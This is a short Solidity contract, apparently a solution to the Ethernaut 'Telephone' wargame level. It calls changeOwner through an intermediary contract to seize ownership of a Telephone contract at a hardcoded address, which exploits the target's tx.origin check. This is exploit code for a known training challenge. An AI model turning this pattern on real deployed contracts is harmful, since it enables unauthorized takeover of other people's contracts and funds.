// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { ITelephone } from "src/Telephone/ITelephone.sol";

contract TelephoneAttack {
    function telephonePwnd(address newOwner) public {
        ITelephone telephoneInstance = ITelephone(address(0x9C8c5967d7168F12aDC32Fb96EfaDabdb96bED9F));
        telephoneInstance.changeOwner(newOwner);
    }
}